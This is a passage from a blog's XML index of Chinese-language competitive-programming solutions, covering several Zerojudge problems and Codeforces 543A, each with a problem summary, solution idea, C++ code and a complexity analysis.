]]></content>
      <categories>
        <category>Zerojudge</category>
      </categories>
      <tags>
        <tag>資料結構</tag>
        <tag>Zerojudge</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge e286</title>
    <url>/2020/06/28/Zerojudge%20e286/</url>
    <content><![CDATA[<h1 id="Zerojudge-e286"><a href="#Zerojudge-e286" class="headerlink" title="Zerojudge e286"></a>Zerojudge e286</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=e286" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=e286</a><br>給兩場比賽中四局的兩隊比數，求輸贏與比分</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>跟著題目照做即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> tmp,A_win=<span class="number">0</span>,B_win=<span class="number">0</span>,tot_a=<span class="number">0</span>,tot_b=<span class="number">0</span>;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;<span class="number">2</span> ; k++)&#123;</span><br><span class="line">		tot_a = tot_b = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			tot_a+=tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">4</span> ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			tot_b+=tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;tot_a&lt;&lt;<span class="string">":"</span>&lt;&lt;tot_b&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">if</span>(tot_a&gt;tot_b)</span><br><span class="line">			A_win++;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(tot_a&lt;tot_b)</span><br><span class="line">			B_win++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(A_win&gt;B_win)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Win\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(B_win&gt;A_win)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Lose\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Tie\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(1)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c463</title>
    <url>/2020/06/28/Zerojudge%20c463/</url>
    <content><![CDATA[<h1 id="Zerojudge-c463"><a href="#Zerojudge-c463" class="headerlink" title="Zerojudge c463"></a>Zerojudge c463</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c463" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c463</a><br>給一棵樹，求其根與高度和<br>高度定義為節點到距離最近的葉節點距離</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>找根可以利用根沒有父節點的特性，可以透過記錄每個點是否有父節點找到<br>找到根後就可以從根開始DFS，尋找各節點的高度並回傳，且葉節點高度為0</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,t;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; Next[<span class="number">100005</span>];</span><br><span class="line"><span class="keyword">bool</span> par[<span class="number">100005</span>];</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> last)</span></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> end=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> h=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: Next[now])&#123;</span><br><span class="line">		<span class="keyword">if</span>(i==last)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">long</span> <span class="keyword">long</span> tmp = dfs(i,now);</span><br><span class="line">		h=max(h,tmp);</span><br><span class="line">		ans+=tmp;</span><br><span class="line">		end=<span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(end)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> h+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>,tmp ; j&lt;t ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			Next[i].push_back(tmp);</span><br><span class="line">			Next[tmp].push_back(i);</span><br><span class="line">			par[tmp] = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> root=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!par[i])&#123;</span><br><span class="line">			root=i;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;root&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ans += dfs(root,<span class="number">-1</span>);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>找根的時間複雜度為 $O(n)$<br>DFS會遍歷每個點，且每個點便利的時間複雜度為 $O(1)$，DFS時間複雜度為 $O(n)$<br>總時間複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>recursive</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c462</title>
    <url>/2020/06/28/Zerojudge%20c462/</url>
    <content><![CDATA[<h1 id="Zerojudge-c462"><a href="#Zerojudge-c462" class="headerlink" title="Zerojudge c462"></a>Zerojudge c462</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c462" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c462</a><br>定義長度為 $k$ 的大寫字串與長度為 $k$ 的小寫字串串接而成的字串稱為 <code>k-交錯字串</code><br>給一個字串與 $k$ ，求最長的 <code>k-交錯字串</code> 長度</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>用一個陣列去記錄長度，分成幾種狀況討論</p>
<ol>
<li>$s[i]$ 和 $s[i-1]$ 同為大寫或小寫<ol>
<li>本輪循環長度已經超過 $k$<br> 表示循環已經被破壞，並從長度 $k$ 開始重新運算</li>
<li>本輪循環長度小於 $k$<br> 循環長度為上一層+1</li>
</ol>
</li>
<li>$s[i]$ 和 $s[i-1]$ 不同為大寫或小寫<ol>
<li>上一個循環長度為 $k$ 的倍數<br> 表示上一個有完成 $k$ 個循環，可以繼續增長循環</li>
<li>上一個循環長度不為 $k$ 的倍數<br> 表示上一個沒有完成 $k$ 個循環，不能繼續增長循環，從1開始計算</li>
</ol>
</li>
</ol>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">1000000</span>];</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_lower</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (c&gt;=<span class="string">'a'</span> &amp;&amp; c&lt;=<span class="string">'z'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_higher</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (c&gt;=<span class="string">'A'</span> &amp;&amp; c&lt;=<span class="string">'Z'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">same</span><span class="params">(<span class="keyword">char</span> a,<span class="keyword">char</span> b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (is_lower(a) &amp;&amp; is_lower(b)) || (is_higher(a) &amp;&amp; is_higher(b));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		<span class="keyword">int</span> lower=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> higher=<span class="number">0</span>;</span><br><span class="line">		arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> times=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!same(s[i],s[i<span class="number">-1</span>]))&#123;</span><br><span class="line">				<span class="keyword">if</span>(arr[i<span class="number">-1</span>]%n!=<span class="number">0</span>)&#123;</span><br><span class="line">					arr[i]=<span class="number">1</span>;</span><br><span class="line">					times=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					arr[i]=arr[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">					times++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(arr[i<span class="number">-1</span>] &gt;= n*times)&#123;</span><br><span class="line">					arr[i]=n;</span><br><span class="line">					times=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					arr[i]=arr[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i]%n==<span class="number">0</span>)</span><br><span class="line">				ans=max(ans,arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(len(s))$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge e287</title>
    <url>/2020/06/28/Zerojudge%20e287/</url>
    <content><![CDATA[<h1 id="Zerojudge-e287"><a href="#Zerojudge-e287" class="headerlink" title="Zerojudge e287"></a>Zerojudge e287</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=e287" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=e287</a><br>給一張地圖，起點從權重最小的點開始，每次往四周沒走過且權重最小的點移動，求移動權重的總和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>用DFS照做即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,ans=<span class="number">0</span>,arr[<span class="number">105</span>][<span class="number">105</span>],dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line">pii start=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cango</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x&lt;<span class="number">0</span> || y&lt;<span class="number">0</span> || x&gt;=n || y&gt;=m)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(pii s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x=s.first;</span><br><span class="line">	<span class="keyword">int</span> y=s.second;</span><br><span class="line">	vis[x][y]=<span class="literal">true</span>;</span><br><span class="line">	ans+=arr[x][y];</span><br><span class="line">	<span class="keyword">int</span> Min=INT_MAX;</span><br><span class="line">	pii next=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> nx=x+dir[i][<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">int</span> ny=y+dir[i][<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span>(!vis[nx][ny] &amp;&amp; cango(nx,ny))&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[nx][ny]&lt;Min)&#123;</span><br><span class="line">				next=make_pair(nx,ny);</span><br><span class="line">				Min=arr[nx][ny];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(next.first==<span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		dfs(next);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">int</span> Min=INT_MAX;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;m ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			<span class="keyword">if</span>(arr[i][j]&lt;Min)&#123;</span><br><span class="line">				start=make_pair(i,j);</span><br><span class="line">				Min=arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	dfs(start);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>輸入時間複雜度為 $O(nm)$<br>DFS最多每個點都遍歷過，且每個點遍歷時間複雜度為 $O(1)$ ，DFS總時間複雜度為 $O(nm)$<br>總時間複雜度 $O(nm)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforces 543A</title>
    <url>/2020/09/13/codeforces%20543A/</url>
    <content><![CDATA[<h1 id="codeforces-543A"><a href="#codeforces-543A" class="headerlink" title="codeforces 543A"></a>codeforces 543A</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p>今天有 $n$ 個程式設計師，要寫 $m$ 行程式碼<br>第 $i$ 個程式設計師每寫1行分別會有 $bug[i]$ 個bug<br>給定 $n$ $m$ $b$ $p$ $bug[]$<br>要求在總共不超過 $b$ 個bug的情況下， $n$ 個程式設計師完成 $m$ 行程式碼的方法數有多少種<br>由於結果可能很大，求總和模 $p$ 的值</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>觀察題目後，可以發現到會影響到bug總數的會是 <strong>哪個程式設計師</strong> 以及 <strong>寫了幾行</strong></p>
<p>定義 </p>
<blockquote>
<p>$dp[i][j][k]$ 表示第 $i$ 個程式設計師寫了 $j$ 行code後bug總數為 $k$ 的方法數</p>
</blockquote>
<p>可以得到轉移式</p>
<blockquote>
<p>$dp[i][j][k] = $$\Sigma_{l=0}^{j}  dp[i-1][j-l][k-bug[i]*l]$$ $mod p$</p>
</blockquote>
<p>做到這邊可以得到正確的解，但是估計一下時間複雜度<br>每個狀態要以 $O(m)$ 的時間處理<br>又我們有 $nmb$ 種狀態，總時間複雜度為 $O(nm^2b)$<br>顯然這樣的時間是不行的</p>
<p>我們希望我們能在 $O(1)$ 的時間完成一個狀態<br>觀察我們的轉移式，以 $dp[3][2][4]$ 和 $dp[3][1][2]$ 為例，並假設所有人的$bug[i]$都是2</p>
<blockquote>
<p>$dp[3][2][4] = dp[2][2][4] + dp[2][1][2] + dp[2][0][0]$</p>
</blockquote>
<blockquote>
<p>$dp[3][1][2] = dp[2][1][2] + dp[2][0][0]$</p>
</blockquote>
<p>可以發現到，中間只差了 $dp[2][2][4]$<br>也就是說</p>
<blockquote>
<p>$dp[i][j][k] = dp[i][j-1][k-bug[i]] + dp[i-1][j][k]$</p>
</blockquote>
<p>透過這樣的方式，可以得到一個時間複雜度為 $O(nmb)$ 的好做法<br>不過傳到codeforces出現compile error，空間使用量過大</p>
<p>再次觀察上面的轉移式，可以發現到我們的 $i$ 只跟 $i$ 和 $i-1$ 有關，也就是說，我們只需要儲存兩個就可以表達全部</p>
<blockquote>
<p>$dp[i][j][k] = dp[i][j-1][k-bug[i]] + dp[!(i%2)][j][k]$</p>
</blockquote>
<p>如此一來就完成了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">2</span>][<span class="number">510</span>][<span class="number">510</span>]=&#123;<span class="number">1</span>&#125;,bug[<span class="number">510</span>],n,m,b,mod,ans=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;b&gt;&gt;mod;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;bug[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;=m ; j++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;=b ; k++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(j &amp;&amp; k&gt;=bug[i]) dp[i%<span class="number">2</span>][j][k] = (dp[i%<span class="number">2</span>][j<span class="number">-1</span>][k-bug[i]] + dp[!(i%<span class="number">2</span>)][j][k])%mod;</span><br><span class="line">				<span class="keyword">else</span> dp[i%<span class="number">2</span>][j][k] = dp[!(i%<span class="number">2</span>)][j][k];</span><br><span class="line">				<span class="keyword">if</span>(i==n &amp;&amp; j==m) ans=(ans+dp[i%<span class="number">2</span>][j][k])%mod;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $nmb$ 種狀態，每種狀態轉移複雜度為 $O(1)$<br>總複雜度 $O(nmb)$</p>
]]></content>
      <categories>
        <category>codeforces</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>codeforces</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge e289</title>
    <url>/2020/06/29/Zerojudge%20e289/</url>
    <content><![CDATA[<h1 id="Zerojudge-e289"><a href="#Zerojudge-e289" class="headerlink" title="Zerojudge e289"></a>Zerojudge e289</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=e289" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=e289</a><br>定義一個字串是美麗的為長度 $m$ 且有 $m$ 種不同顏色存在<br>給一個字串及長度 $m$ ，求美麗的字串個數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>題目中的輸入可到 $10^{150}$，所以選擇用字串儲存<br>可以先將字串 $0$ ~ $m-1$先塞入map，則後面每次只需</p>
<ol>
<li>將 $s[i]$ 塞入map</li>
<li>檢查size是否為 $m$，若是就將答案加1</li>
<li>將頭去掉</li>
</ol>
<h3 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h3><p>其實也不一定需要用到map<br>我們需要實現的只有能快速搜尋<br>可以先排序($O(logn)$)再二分搜($O(logn)$)<br>也可以達到map相同的效果</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m,n,ans=<span class="number">0</span>,cnt=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">string</span> tmp[<span class="number">200005</span>];</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	mp.clear();</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,head=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;tmp[i];</span><br><span class="line">		<span class="keyword">if</span>(i&lt;m<span class="number">-1</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(mp.count(tmp[i])) mp[tmp[i]]++;</span><br><span class="line">			<span class="keyword">else</span> mp[tmp[i]]=<span class="number">1</span>,cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(mp[tmp[i]]) mp[tmp[i]]++;</span><br><span class="line">			<span class="keyword">else</span> mp[tmp[i]]=<span class="number">1</span>,cnt++;</span><br><span class="line">			<span class="keyword">if</span>(cnt == m) ans++;</span><br><span class="line">			<span class="keyword">if</span>(mp[tmp[head]]<span class="number">-1</span>) mp[tmp[head]]--;</span><br><span class="line">			<span class="keyword">else</span> mp.erase(tmp[head]),cnt--;</span><br><span class="line">			head++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

